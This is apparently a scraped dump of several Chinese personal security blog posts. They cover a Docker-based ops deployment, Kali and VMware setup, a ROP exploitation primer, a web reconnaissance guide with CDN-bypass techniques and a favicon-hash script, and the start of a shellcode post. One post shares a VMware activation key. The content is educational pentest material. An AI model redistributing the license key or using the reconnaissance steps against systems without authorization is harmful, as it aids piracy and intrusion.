\u0026#34;ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;你的密码\u0026#39;;\u0026#34; 因为需要让跑Web Server的那台机器访问到数据库，我们进行配置一下权限，顺便再建一个叫做DB的数据库(以存放WordPress的数据)\n为了安全性，我们只许可Web Server的机器用root的用户名和密码登陆\n注意这里指mysql的root用户，和系统的root用户不一样哦 - -\ndocker exec -ti MySQL mysql -u root -p123.密码 -e \u0026#34;use mysql; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;root\u0026#39;@\u0026#39;ip\u0026#39;IDENTIFIED BY \u0026#39;密码\u0026#39; WITH GRANT OPTION; flush privileges; create database db;\u0026#34; 备份 好啦，最后要做的就是定时备份数据库\n毕竟数据无价是真理嘛awa\n首先给数据库的主机装个NFS客户端并每次启动时挂载共享文件夹\nyum -y install nfs-utils mount.nfs IP:/DB_Backup /mnt/backup/ echo \u0026#39;mount.nfs IP:/DB_Backup /mnt/backup/\u0026#39; \u0026gt;\u0026gt; /etc/rc.local echo \u0026#39;docker start MySQL\u0026#39; \u0026gt;\u0026gt; /etc/rc.local chmod +x /etc/rc.local 现在来到容器内部完成真正定时\u0026quot;备份\u0026quot;的操作\n我们决定每天备份一次数据库，这个时候小小偷个懒，不用crontab -e了，直接将脚本放到/etc/cron.daily\n我们可以把备份的脚本放在GitLab里\n#!/bin/bash mysqldump -u root -p密码 --all-databases \u0026gt; /db/data-dump.sql date=\u0026#34;$(date +%F)\u0026#34; cp /db/data-dump.sql /mnt/backup/DB_$date rm -rf /db/data-dump.sql 由于我们脚本里需要用到/db目录，我们得先建\ndocker exec -ti MySQL sh -c \u0026#34;mkdir /db\u0026#34; 然后就git pull到/etc/cron.daily目录并赋予适当权限(记得先在容器里安装git哦)\ndocker exec -ti MySQL yum -y install git docker exec -ti MySQL sh -c \u0026#34;git clone http://IP/nanosec/backup.git /etc/cron.daily/\u0026#34; docker exec -ti MySQL sh -c \u0026#34;chmod +x /etc/cron.daily/backup.sh\u0026#34; 然后可以先运行一下看看是否备份成功\ndocker exec -ti MySQL sh -c \u0026#34;/etc/cron.daily/backup.sh\u0026#34; 附上代码 mkdir /mnt/backup yum -y install nfs-utils mount.nfs 192.168.245.129:/DB_Backup /mnt/backup/ echo \u0026#39;mount.nfs 192.168.245.129:/DB_Backup /mnt/backup/\u0026#39; \u0026gt;\u0026gt; /etc/rc.local echo \u0026#39;docker start MySQL\u0026#39; \u0026gt;\u0026gt; /etc/rc.local chmod +x /etc/rc.local docker run --name MySQL -p 3306:3306 -d -t -v /mnt/backup:/mnt/backup centos:latest docker exec -it MySQL sh -c \u0026#34;sed -i \u0026#39;s/mirrorlist/#mirrorlist/g\u0026#39; /etc/yum.repos.d/CentOS-*\u0026#34; docker exec -ti MySQL sh -c \u0026#34;sed -i \u0026#39;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g\u0026#39; /etc/yum.repos.d/CentOS-*\u0026#34; docker exec -ti MySQL yum makecache docker exec -ti MySQL yum -y install mariadb mariadb-server docker exec -ti MySQL yum -y install wget docker exec -ti MySQL yum -y install python3 docker exec -ti MySQL yum -y install git docker exec -ti MySQL sh -c \u0026#34;wget https://raw.githubusercontent.com/gdraheim/docker-systemctl-replacement/master/files/docker/systemctl3.py -O /usr/local/bin/systemctl\u0026#34; docker exec -ti MySQL sh -c \u0026#34;chmod +x /usr/local/bin/systemctl\u0026#34; docker exec -ti MySQL systemctl start mariadb docker exec -ti MySQL systemctl enable mariadb docker exec -ti MySQL mysql -e \u0026#34;ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;密码\u0026#39;;\u0026#34; docker exec -ti MySQL mysql -u root -p密码 -e \u0026#34;use mysql; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;root\u0026#39;@\u0026#39;IP\u0026#39;IDENTIFIED BY \u0026#39;密码\u0026#39; WITH GRANT OPTION; flush privileges; create database db;\u0026#34; docker exec -ti MySQL sh -c \u0026#34;mkdir /db\u0026#34; docker exec -ti MySQL sh -c \u0026#34;git clone http://192.168.245.129/nanosec/backup.git /etc/cron.daily/\u0026#34; docker exec -ti MySQL sh -c \u0026#34;chmod +x /etc/cron.daily/backup.sh\u0026#34; docker exec -ti MySQL sh -c \u0026#34;/etc/cron.daily/backup.sh\u0026#34; 配置Nginx反向代理 呼，最后的工作则是配置Nginx反向代理\n(心里:aaaaaaa总算熬到头了)\nJenkins项目 到这里应该已经成为\u0026quot;老油条\u0026quot;了，\n直接利用模板+修改一把梭\n最后大概确定应该肯定是这样纸捏\n部署Nginx反向代理 为了用户访问方便，这次直接映射到80端口\ndocker run --name N_Proxy -p 80:80 -d -t centos:latest 安装 Nginx反代嘛= =\n当然就是要装Nginx\ndocker exec -ti N_Proxy yum -y install nginx 然后就是日常对服务的操作\ndocker exec -ti N_Proxy systemctl start nginx docker exec -ti N_Proxy systemctl enable nginx 配置 老样子，先把默认的网站文件删除\ndocker exec -ti N_Proxy sh -c \u0026#34;rm -rf /usr/share/nginx/html/*\u0026#34; 然后就到了最关键一步，配置文件的调整\n为了之后修改配置文件能够优雅地偷懒，我们将配置文件托管在GitLab上\nuser nginx; worker_processes auto; error_log /var/log/nginx/error.log; pid /run/nginx.pid; # Load dynamic modules. See /usr/share/doc/nginx/README.dynamic. include /usr/share/nginx/modules/*.conf; events { worker_connections 1024; } http { log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; # Load modular configuration files from the /etc/nginx/conf.d directory. # See http://nginx.org/en/docs/ngx_core_module.html#include # for more information. include /etc/nginx/conf.d/*.conf; #include /etc/nginx/default.d/*.conf; upstream web1 { server 192.168.245.149:8888 weight=1; #此处填写被代理服务器IP #server 192.168.0.17 weight=1; #ip_hash; } server{ listen 80; server_name blog.nanosec.io; access_log /var/log/nginx/blog.log; location / { root /home/web1_root; proxy_pass http://web1; proxy_read_timeout 300; proxy_connect_timeout 300; proxy_redirect off; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } } 我们先把原有的配置文件干掉\ndocker exec -ti N_Proxy sh -c \u0026#34;rm -rf /etc/nginx/nginx.conf\u0026#34; 然后再放上新的配置文件\n注意：因为git clone无法clone进一个已经存在的目录\n所以我们需要先clone到一个其他位置并进行移动\ndocker exec -ti N_Proxy sh -c \u0026#34;git clone http://192.168.245.129/nanosec/your-code-here.git\u0026#34; docker exec -ti N_Proxy sh -c \u0026#34;cp /your-code-here/nginx.conf /etc/nginx/\u0026#34; 检查配置文件是否存在问题\ndocker exec -ti N_Proxy nginx -t 检查无误后再重新加载配置文件\ndocker exec -ti N_Proxy nginx -s reload 完工 这个时候就可以让这个项目跑起来啦awa\n到这里我们访问反向代理的ip或者把blog.nanosec.io解析到这个ip后访问就可以看到Web Server的那个网页啦\nPart3\u0026ndash;结语 Hmmm,这样一个有意思的自动化企业网络架构部署到这里就完成了\n优势 可以说是为运维带来了很大的便捷，一旦机器多起来一台一台装显得费时费力又不现实，\n自动化通过按几个键就能完成部署，在很大程度上提高了效率 = =\n以后的维护也是变得特别简单了\n要是代码和配置文件需要更改直接去GitLab改 要是一些配置步骤需要微调直接在Jenkins上操作 新加入的机器只需要按几个键就可以完成部署 一些思考 关于本方案如何改进 使用ZStack私有云，在与Docker共度了几个夜晚之后，我发现如果在拥有足够的性能条件下，还是使用虚拟机比较好，至于原因嘛，一是对于新手来说友好，配置/使用更加方便，二是安全性更高，毕竟虚拟机逃逸比容器逃逸要困难 本次实验由于性能问题，没带动ZStack(悲\n可以把Jenkins里配置的命令集合成脚本，并也托管到GitLab上，这样后期维护会更加便捷 备份最好独立一台机器，并把GitLab和Jenkins里的东西也做相应备份 关于安全的思考 怎么说呢。。。这种事情就把所有机器的权限高度集中在一个地方了，这实际上在某种意义上也是十分危险的= =\n因为一旦集中权限的机器被入侵，那就是\u0026quot;全都没了\u0026quot;的惨剧了\n就举个最简单的例子，Jenkins机器放到了公网上，而且还是弱密码= =\n当然，从攻击者的角度，可以考虑对于权限集中的地方下手;)\nPart 4 \u0026ndash; Ref http://book.fsec.io/\n","date":"2022-07-07T17:20:00+08:00","image":"https://blog.nanosec.site/p/%E6%A8%A1%E6%8B%9F%E6%90%AD%E5%BB%BA%E4%BC%81%E4%B8%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E4%BD%93%E7%B3%BB/cover_hu4ba822080187716f522aa24ca87917bf_1033765_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/%E6%A8%A1%E6%8B%9F%E6%90%AD%E5%BB%BA%E4%BC%81%E4%B8%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E4%BD%93%E7%B3%BB/","title":"模拟搭建企业自动化运维体系"},{"content":"Kali Gnome桌面环境の调整\u0026amp;美化 最近刚把kali桌面环境从xfce迁移到了gnome,主要是看中了gnome的\u0026quot;任务栏\u0026quot;美观这一点,\n不过这一换貌似有点后悔，不得不说kali还是默认的xfce舒适= =\ngnome不仅占用更多的资源，而且在GUI方面可供自定义的地方也少了很多:(\n不过既然已经干了这事，我也懒得再换回来了((\n那就好好调教一下gnome吧awa\n切换默认终端 个人感觉gnome默认的terminal很鸡肋，可以花里胡哨个性化的地方比较少，\n于是我决定做一个感天动地の大事:把默认终端换成xfce默认的qterminal\n先安装qterminal\nsudo apt install qterminal 然后配置默认终端\nsudo update-alternatives --config x-terminal-emulator 输入命令后在下面会出现一个列表，输入qterminal的序号并敲回车就可以了喵\n调整\u0026quot;任务栏\u0026quot;位置 找了半天，发现图形界面里没有一个地方是可以调任务栏位置的= =\n嘛\u0026hellip;.原来是只能用命令行= =\ngsettings set org.gnome.shell.extensions.dash-to-dock dock-position 位置 关于这个位置支持的值说明:\nBOTTOM -\u0026gt; 底部\nLEFT -\u0026gt; 靠左\nRIGHT -\u0026gt; 靠右\nTOP -\u0026gt; 顶部\n用户头像设置排坑 因为Kali的安全设置(很有可能是权限)问题，\n使本来很愉快的换头像变成一件非常狗的事情\n因为不能走GUI快捷通过点点点换一个好看的头像，\n所以只能上配置文件了;(\nsudo vi /var/lib/AccountsService/users/你的用户名 按i进入编辑模式对配置文件进行修改\n[User] Icon=你图片的绝对路径 #绝对路径就是从/开始的那个 Language= XSession= SystemAccount=true 按Esc并输入:wq,再Enter保存并退出\n然后再进入你图片所在的目录，调整下改图片文件的权限\nsudo chmod 777 你的图片 然后再退出登陆，就可以看到你更改的头像啦~~\n调教后整体效果 废话不说，直接上图0.0\nref 「GNOME」- 登录界面，GDM，GNOME Display Manager - K4NZ BLOG\n怎么在Ubuntu中安装多个终端以及更改默认终端 - 系统运维 - 亿速云\nMove Launcher Bar to the Bottom/Right using Terminal in Ubuntu? - Technoresult\n","date":"2022-05-27T14:45:16+08:00","image":"https://blog.nanosec.site/p/kali-gnome%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E3%81%AE%E8%B0%83%E6%95%B4%E7%BE%8E%E5%8C%96/cover_hu81a9c413a1c8e188446087e0ced1bda4_3605489_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/kali-gnome%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E3%81%AE%E8%B0%83%E6%95%B4%E7%BE%8E%E5%8C%96/","title":"Kali Gnome桌面环境の调整\u0026美化"},{"content":"GitHub Pages配置自定义域名以及CDN 嘶~~,最近在折腾博客\n刚买了个域名，由于没有服务器,就把域名绑定到我博客上来了\n嘛= =,闲话不多说，直接上做法\u0026hellip;\n配置自定义域名 如果你没有域名，且是白嫖党 (而且是经费不足的那种) ，下面这一段你可以绕过了\n前置准备 一个域名(需要购买)\n这里推荐几个买域名的地方\n腾讯云DNSPod\n优点:价格第一年便宜，能低至7-8元的\n缺点:国内的要实名，而且实名审核要一定时间\nP.S. 像我们这种个人建议别买.cn域名，不是说.cn域名不好，而是因为有可能通过whois查出你的一些个人信息\n我相信看到这里一些人肯定想去查了，先说好了，要是出什么问题我可不负责XD~~\nGoDaddy\n优点:国外的不需要实名\n缺点:价格相对贵一点,不支持微信支付\n一个在GitHub Pages部署好的网站\nTip:要是没有的话可以按照我之前的文章来搭一个个人网站\n快乐de配置过程 DNS解析方面 首先打开你域名DNS解析记录的控制台\n没有链接提供! 各个平台控制台的位置不一样 ;\u0026lt;\n然后新建一条CNAME记录\nCNAME类似于你域名的一个别名,如果域名A建立了一条CNAME记录指向域名B,你请求A就会去请求B\n现在我们看向上图中右边两个框框，又到了做填空的时候呐!\nName(名称)填你想要的子域名或者是@\n举个糖炒板栗(逃: 如果你的域名是nanosec.site,你这里输入@别人访问nanasec.site的时候是这个网站,如果你填了blog,别人访问blog.nanosec.site是你的网站\nTarget(目标)填你GitHub Pages哪个网站的域名，一般是你的用户名.github.io,如果你忘了你的用户名 (这什么有大病的如果) 你可以去下面的评论区发条评论，然后你的用户名就会显示出来啦 : 3\nGitHub方面 首先登录到GitHub，然后打开你网站的那个仓库的设置的Pages栏\n如果你找不到仓库了,你可以去下面的评论区发条评论，然后点击你的用户名，你的个人界面就打开了~~\n然后在上图中的Custom domain下面的框中填写你之前配置好的域名\n点击Save,等它检测完成\u0026hellip;.\n看到上面有一行绿色的英文Your site is published at https://你的域名/就可以吃西瓜啦~(≧▽≦)/~\n之后别人访问你的域名就可以打开你自己网站了\nCloudFlare免费CDN配置 进入CloudFlare官网，选择免费的那个计划\n然后就是日常的注册/登录操作\n进入你个人用户的面板-\u0026gt;Websites(网站)了之后,点击Add A Site(添加网站)\n然后输入你的域名,点击Add Site(添加网站)\n之后选择Free(免费)的那个计划，\n接下来的操作有了CloudFlare官方详细的提示就是有手就行的事情啦\n","date":"2022-05-15T02:19:13-04:00","image":"https://blog.nanosec.site/p/github-pages%E9%85%8D%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E4%BB%A5%E5%8F%8Acdn/cover_hu7ef721bb127455c22405c2143026501a_3462223_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/github-pages%E9%85%8D%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E4%BB%A5%E5%8F%8Acdn/","title":"GitHub Pages配置自定义域名以及CDN"},{"content":"网安猫猫资源库 喵~~\n事情是这样的，搞了一个会卖萌的Telegram频道存放一些自己学习时用的网安资源，\n既然都集中存放了，干脆分享给有幸看到我blog的朋友们吧，其中包括\nWeb安全教程\nPWN教程\n一些好用的工具\nCVE推送\n链接:Telegram: Contact @nanosec47\n附属群(欢迎来吹水):Telegram: Contact @nanonanoda\n个人收集的资源，非广告/营销号，不喜欢请默默离开，勿喷.uwu.\n","date":"2022-05-13T03:44:40-04:00","image":"https://blog.nanosec.site/p/%E7%BD%91%E5%AE%89%E7%8C%AB%E7%8C%AB%E8%B5%84%E6%BA%90%E5%BA%93/cover_hu1d28bf14f3bac81f6a767dcaeaeb18c8_196702_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/%E7%BD%91%E5%AE%89%E7%8C%AB%E7%8C%AB%E8%B5%84%E6%BA%90%E5%BA%93/","title":"网安猫猫资源库"},{"content":"Debian Linux下安装虚拟机软件 VirtualBox VirtualBox相对来讲安装较为简单，且还是开源免费的，占用系统资源较少\n安装最新版本内核头文件/内核镜像 为了避免系统因为\u0026quot;年久失修\u0026quot;内核版本不是最新，我们尽量避免使用网上提供的这种方式\nsudo apt-get install linux-headers-`uname -r` 采用以下命令\nsudo apt update sudo apt-cache search linux-image sudo apt-get install linux-headers-xxx linux-image-xxx #后面的xxx是上面语句中搜索出来的版本号和系统架构 init 6 #装完重启 apt安装VirtualBox apt-get install virtualbox virtualbox-guest-additions-iso VMware Workstation 比起VBox,VMware折腾起来坑真的好多啊= =\n不过没办法。。。我还有10多个VMware的虚拟机w(\n安装最新版本内核头文件/内核镜像 第一步和安VBox一样的操作\nsudo apt update sudo apt-cache search linux-image sudo apt-get install linux-headers-xxx linux-image-xxx #后面的xxx是上面语句中搜索出来的版本号和系统架构 init 6 #装完重启 安装各种编译器 sudo apt-get install build-essential 安装VMware Workstation 去官网下载安装程序\n给可执行权限\nchmod x VMware-Workstation-Full-版本号.bundle #TIP:文件名太长可以Tab补全 运行\nsudo ./VMware-Workstation-Full-版本号.bundle 安装好之后想要运行直接终端输入vmware就可以了\n排坑 如果你顺利的话完成上面几步之后依照提示就可以结束这快乐的安装过程了\n但是，，，我还遇到了更多奇奇怪怪的坑\n如果各位朋友也遇到了，可以参考下解决方案\nVMware在编译和安装vmmom和vmnet两个模块的时候出了问题，查了各种解决方案都没用\n最后，我采取了手动编译安装两个模块的方法\n暴力出奇迹\u0026ndash;永远不变的真理 逃)\n以下是具体解决方案，英语好的伙伴们可以参考这个官方论坛帖子捏~~\n先下载模块的源码\n由于这里git clone不知道为什么并不能拉取所有源码，所以我们这里选择下载zip包\n解压后进入源码目录\nunzip vmware-host-modules-workstation-16.2.1.zip cd vmware-host-modules-workstation-16.2.1 编译+安装\nmake sudo make install 模块安装完之后重启vmware服务\nsudo systemctl restart vmware 完成之后再运行VMware Workstation,就应该可以正常进入程序了\nvmware 激活 网上VMware激活码可谓了一大堆\n为了帮大家偷懒 (逃 ，我在下面放上一个目前(2022.5)能用的\nZF3R0-FHED2-M80TY-8QYGC-NPKYF Ref http://book.fsec.io/101-%E5%9F%BA%E7%A1%80%E7%AF%87/101-A-linux%E5%9F%BA%E7%A1%80/101-A2-Kali%20Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E8%AF%95.html#5-%E5%AE%89%E8%A3%85-virtualbox-%E8%99%9A%E6%8B%9F%E6%9C%BA\nhttps://www.a5idc.com/helpcontent/347.html\nhttps://communities.vmware.com/t5/VMware-Workstation-Pro/Workstation-16-Kernel-Module-Install-Error/m-p/2864257#M171145\n","date":"2022-05-05T09:31:14-04:00","image":"https://blog.nanosec.site/p/debian-linux%E4%B8%8B%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BD%AF%E4%BB%B6/cover_hu5a0bff5542c2b4a2a99ba03dfc469cdd_192581_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/debian-linux%E4%B8%8B%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BD%AF%E4%BB%B6/","title":"Debian Linux下安装虚拟机软件"},{"content":"PWN! PWN! PANG! Part6 呼～好久没有玩PWNPWN车了 (又再次摆烂的PGR)\n本篇文章给大家来谈谈ROP\n什么是ROP ROP寄存器(?\n不存在的啦 233 = =\nROP是Return Oriented Programming(返回导向编程)的简称\n\u0026ldquo;又是专业术语?? 整天术语!术语!术语!\u0026rdquo;\nww,别打了(, 这就简单讲解嘛= =\nROP是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过前几篇文章的介绍，我们可以发现栈溢出的控制点是ret处(也就是子函数的ret addr)，那么ROP的核心思想就是利用以ret结尾的指令序列(gadgets)把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。\n还不够简单?\nQAQ, 我们首先了解一下为什么要用到ROP\n为什么需要ROP 我们很容易就发现，前几次的PWN攻击都是通过栈溢出篡改函数返回地址来一次性使程序跳转到某个恶意地址(后门函数或者shellcode)，从而getshell\n然而，并不是每一次都是有那么好的运气的，程序猿写后门函数的肯定少，在加上各种程序的保护机制，导致想要跳转到shellcode也不大可能\n这个时候，就该ROP上场了\nROP的过程的简单介绍 我们思考一下，我们之前通过栈溢出覆盖掉了函数的返回地址，那么既然是溢出，我们也可以溢出覆盖更多数据，从而控制更多内容。\n栈溢出的目的是控制程序执行流，如果一次不能实现返回到一个恶意地址来getshell,那么就需要让程序执行流在我们的控制之中，通过多次操作，让程序反复横跳多次跳转并执行恶意指令\n现在来看一看手上能用的东西\n乖乖躺在一边任凭我们折腾的栈\n程序本身的一些代码小片段(即下文提到的gadget)\ngadget 谈到ROP就必须讲到gadgets, gadget指程序的一些代码片段\n我们可以通过返回到含有pop和ret(比如pop eax; ret;)的gadgets的地址来实现特定操作而又使程序的执行流还在我们的控制中\n由于栈是受我们的控制的，我们可以在栈中写入任意的内容\n不妨设我们在覆盖了ret addr后又覆盖了一些内容\nret addr \u0026ndash; gadget A(pop eax; ret;)地址\n0xb\ngadget B 地址\n这样我们就构造了一个简单的ROP链\n来模拟一下此时被搞得不成样子的程序的执行过程= =\n由于ret addr被覆盖掉了w, 程序下一步会去执行gadget A\n首先执行pop eax,这个时候栈中的0xb就会被弹到eax寄存器中\n然后是ret, 程序又被强迫去执行gadget B了.UwU.\n由此类推，接下来攻击者可以让程序执行更多的gadget, 从而getshell\n害，又是一个被骗入传销组织的小程序，可怜啊 bushi)\n实际上, gadget可以理解成一个一个小的积木块，通过构造ROP链把一个个gadget拼凑起来，就构成了完成整个攻击流程的payload\n如何获取gadget 上面扯了这么多，在最后我推荐几个好用的获取gadget的工具\nROPgadget 这款工具主要是帮助你找到合适的gadget\n安装方法\nsudo apt install python3-pip sudo -H python3 -m pip install ROPgadget 获取使用指南\nROPgadget --help 简单举例几个常用命令\nROPgadget --binary 程序 --ropchain #直接构造一个ROP链 ROPgadget --binary 程序 --only \u0026#34;pop|ret\u0026#34; #只寻找含有pop ret的gadgets Onegadget(有一点鸡肋，需要运气成分) 怎么说。。。还是运气不好的时间多= =\n这款工具就有点魔法了，它能够帮你找到可能帮助你一次性getshell的gadget\n一定注意啊!!是可能\n它列出的gadget要能getshell必须满足一定的条件\n至于能不能满足这个条件,,\n你就一个一个放上去试试呗\u0026hellip;\n当然没有一个可以用也是非常常见的\n安装Onegadge需要提前装好ruby，下面是各Linux安装ruby的方法\ndeb(Debian 或 Ubuntu)\nsudo apt-get install ruby-full yum(CentOS、Fedora 或 RHEL)\nsudo yum install ruby portage(Gentoo)\nsudo emerge dev-lang/ruby # 安装指定的版本，要在 make.conf 文件中设置 RUBY_TARGETS。详见 Gentoo Ruby Project 网站。 pacman(Arch Linux)\nsudo pacman -S ruby 安装Onegadget\ngem install one_gadget 使用\none_gadget 程序名 ref 基本ROP讲解 - 简书\n安装 Ruby\nGitHub - david942j/one_gadget: The best tool for finding one gadget RCE in libc.so.6\nGitHub - JonathanSalwan/ROPgadget: This tool lets you search your gadgets on your binaries to facilitate your ROP exploitation. ROPgadget supports ELF, PE and Mach-O format on x86, x64, ARM, ARM64, PowerPC, SPARC and MIPS architectures.\n","date":"2022-04-14T23:21:24-04:00","image":"https://blog.nanosec.site/p/pwn-pwn-pang-part6---rop/cover_hu76ffa02a199d8318bcf8bc7fd89975bb_336695_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/pwn-pwn-pang-part6---rop/","title":"PWN! PWN! PANG! Part6 --- ROP"},{"content":"关于信息收集那些事 在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小(毕竟你找到的东西越多，可能出现漏洞的几率越大嘛= =)\n判断有无CDN 基本上通过超级ping就可以判断了awa\n有CDN\u0026ndash;\u0026gt;尝试绕过 如果多地ping响应的ip不一样，说明该网站配置有CDN\n绕过方法大致有:\n冷门地区地址ping:由于经费原因，服务商不大可能在某些地区搞CDN,所以往往用那些地区的ip来ping的话能找到服务器的真实ip\nDNS解析历史记录:有可能这个服务器之前没有配置CDN,查看历史DNS解析记录可以获得服务器真实IP\n黑暗引擎搜索\n奇怪的www.绕过:有可能某些网站CDN配置的时候忽视了一些细节(比如说带有www.的域名配置了CDN.不带有www.的没有)，部分网站可以用过ping去掉www.的域名来找出服务器真实IP, 比如说著名的学而思网校的网站= =\n咳咳= = 说到这里，某些同学应该跃跃欲试了吧= =，绕过CDN的测试昨晚玩玩可以，但请不要瞎搞\n特定文件hash值:这里放一个Python3脚本(PS:原脚本是基于python2的，我在其基础上修改了下) # -*- coding: gb2312 -*- print(\u0026#34;Missing modules? Run the following commands in cmd/terminal\u0026#34;) print(\u0026#34;pip install base64\u0026#34;) print(\u0026#34;pip install requests\u0026#34;) print(\u0026#34;pip install mmh3\u0026#34;) import mmh3 import requests import base64 print(\u0026#34;Pls input the url you want to hash favicon(Include http(s):// )\u0026#34;) url = input() + \u0026#34;favicon.ico\u0026#34; r = requests.get(url) icon = base64.b64encode(r.content) Hash = mmh3.hash(icon) print(\u0026#34;The hash is:\u0026#34; + str(Hash)) print(\u0026#34;Go to https://www.shodan.io/ and search with http.favicon.hash:\u0026#34; + str(Hash)) 暴力出奇迹= =：采用fuckcdn w8fuckcdn(不推荐) zmap等工具 没有CDN\u0026ndash;\u0026gt;直接上 如果多地ping响应的ip一样，说明该网站没有CDN\n嘛。。。还等什么嘛= = 干就是了\n判断WAF 直接上工具: wafw00f\n工具能帮你判断对方使用的WAF，然后你可以依据该WAF的~~特性 确信)~~来选择绕过的姿势\n子域名收集 推荐工具OneForAll\n子域名可能和主站在同一台服务器上，或者在同一个C段内，目标越多，发现漏洞的可能性越大\n网站目录扫描 御剑后台扫描珍藏版\n目录扫描可以让你有发现一些有趣有价值的页面\nGoogle Hacking 语法信息收集 这种收集方式对于新手非常友好，可以用来搜寻敏感信息泄漏/弱密码/目录遍历等较容易挖掘的漏洞。\n几个好用的语法:inurl: intext: intitle: site:\n黑暗引擎信息收集 fofa, shodan, zoomeye\n可以收集到网站一些和服务有关的信息，便于漏洞检测\nTip:建议通过黑暗引擎搜索的时候尽量使用语法，这样会对你信息收集更有帮助\n关于操作系统的信息收集 通过ttl值判断 ttl是数据包能经过路由的最大数量，每经过一次路由ttl减一。 默认情况下，不同系统ttl值的区别:\nLinux: 64 Windows: 128 注意:TTL值是可手动修改的\n通过大小写敏感判断 Windows:对大小写不敏感\nLinux:对大小写敏感\n这里的大小写敏感针对的是网站目录名和提交给服务器的参数名\n特定的中间件只能用于特定系统 某些中间件只能用于特定的操作系统，如IIS只能用于windows，nginx只能用于Linux\n关于中间件的信息收集 通过应答包判断 在应答包中可能会有server字段 (也就意味着可以后台手动去掉) ，其中代表的则是所有的搭建平台(中间件)类型\n如何找Server字段(?\n去开发者工具里网络一栏，然后刷新界面\n通过报错判断 故意让网页报错，报错页面可能包含中间件一些信息\n比如:\nhttps://www.baidu.com/233333333333333333333333333 别试了，百度的报错不包含中间件信息;)\n懒人必备:第三方工具 站长之家\n关于数据库的信息收集 黑暗引擎一把梭 见上文\n依据默认端口判断 各数据库默认端口\n常见搭配 某些集成化的搭建平台有着固定的网站架构搭配，如PHPStudy,在windows上常见的apache+mysql+php,linux上为nginx+mysql+php\n关于后端语言的信息收集 一目了然法 对于页面直接带有相关文件后缀的，通过后缀直接判断\n添加后缀法 没后缀？加着玩玩试试呗\n在域名的后面手动添加index后在添加php、jsp、py、asp等常见的后端编写语言，哪个能正常显示后端就是哪个语言编写的\n通过应答包判断 应答包用的好，监狱进的早就能收集到不少信息\n可以通过应答包x-powered-by字段判断后端语言\nTip: 现在一些大一点的网站，安全意识较高，都会隐藏相应的字段\n第三方平台yyds= = BuildWith\n关于APP的信息收集 由于部分APP是由网页封装而成，我们可以通过一些手段将对于APP的渗透测试变为Web渗透\n暴力拆包找url 又到了暴力出奇迹的时候了pvp\n工具:漏了个大洞\nBurp抓包APP 没有安装burp的朋友们可以看这篇文章\n如果各位有安卓模拟器，可以将模拟器的代理改成Burp的代理，然后可以给模拟器安装burp的证书。\n如果不想用模拟器的话可以自行参考这篇文章\nRef 小迪安全 · Yuque\n信息收集_Plastilina的博客-CSDN博客\n各个数据库的默认端口 - 张仁国 - 博客园\n","date":"2022-03-17T00:23:45-04:00","image":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/cover_hub66e432b1b6d7210dd7ccd81a1693998_438324_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/","title":"Web安全:关于信息收集那些事"},{"content":"PWN! PWN! PANG! Part5 呼～～好久没有继续更新PWN笔记了 (最近学的Web安全的笔记也没写 逃)\n资料投放 老规矩，开头上资料= =\nret2shellcode\nShellCode 既然今天的话题叫做ret2shellcode,我们先来了解一下ShellCode\n什么是ShellCode shellcode是一段用于利用软件漏洞而执行的代码，也可以认为是一段填充数据，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写\n简而言之，ShellCode就是执行后可以直接getshell的代码\n如何获取ShellCode 获取ShellCode有很多种方法，这里简单介绍几种\n利用PWNTools自带函数 首先设置目标程序 的参数\ncontext(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;)# os指操作系统，这里是Linux # arch指架构，64位一般是amd64，32位一般是i386 # log_level指日志输出的等级，debug为调试模式 